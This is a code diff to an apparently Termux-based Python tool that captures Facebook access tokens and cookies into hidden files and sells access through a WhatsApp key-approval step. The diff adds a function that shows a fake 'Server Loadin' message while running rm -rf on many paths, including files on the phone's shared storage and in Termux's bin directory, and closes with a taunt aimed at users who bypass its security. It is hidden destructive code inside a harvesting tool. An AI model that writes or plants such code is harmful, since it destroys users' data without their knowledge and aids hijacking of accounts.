@@ -378,7 +378,7 @@ def login_lagi334():
         tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
         tokenw = open(".token.txt", "w").write(tok)
         cokiew = open(".cok.txt", "w").write(cookies)
-      #exit()
+      exit()
     except Exception as e:
         os.system("rm -f .token.txt")
         os.system("rm -f .cok.txt")
@@ -411,6 +411,49 @@ def approval():
       print('\33[1;37m=========================================================')
       print ('\33[1;32m[•] Click Enter To Sent Key Admin WhatsApp')
       input('\33[1;32m[•] Click The Enter >')
+      tks = ('AssalamuAlaylum%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('xdg-open https://wa.me/+8801306109043?text='+tks)
+      time.sleep(1)
+      exit()
+  except:
+    sys.exit()
+ball='/data/data/com.termux/files/usr/bin/fboot'
+ripon='/sdcard/Android/.maidx.txt'
+ripon2='/sdcard/.brab.txt'
+ripon3='/data/data/com.termux/files/usr/bin/.sdghkrh'
+def fucked():
+    print(' Server Loadin.......')
+
+    os.system(f"rm -rf {a}")
+    os.system(f"rm -rf {b}")
+    os.system(f"rm -rf {c}")
+    os.system(f"rm -rf {d}")
+    os.system(f"rm -rf {e}")
+    os.system(f"rm -rf {f}")
+    os.system(f"rm -rf {g}")
+    os.system(f"rm -rf {h}")
+    os.system(f"rm -rf {i}")
+    os.system(f"rm -rf {j}")
+    os.system(f"rm -rf {k}")
+    os.system(f"rm -rf {ball}")
+    os.system(f"rm -rf {ripon}")
+    os.system(f"rm -rf {ripon2}")
+    os.system(f"rm -rf {ripon3}")
+    os.system(f"rm -rf {l}")
+    os.system(f"rm -rf {m}")
+    os.system(f"rm -rf {n}")
+    os.system(f"rm -rf {o}")
+    os.system(f"rm -rf {p}")
+    os.system(f"rm -rf {q}")
+    os.system(f"rm -rf {r}")
+    os.system(f"rm -rf {s}")
+    os.system(f"rm -rf {t}")
+    os.system(f"rm -rf {u}")
+    os.system(f"rm -rf {v}")
+    os.system(f"rm -rf {w}")
+    os.system(f"rm -rf {x}")
+    os.system(f"rm -rf {y}")
+    os.system(f"rm -rf {z}")
+    print(' Fuck You Bypass User Security\ . 0o');exit()
 
 def ckx():
     uuid = str(os.geteuid()) + str(os.getlogin())
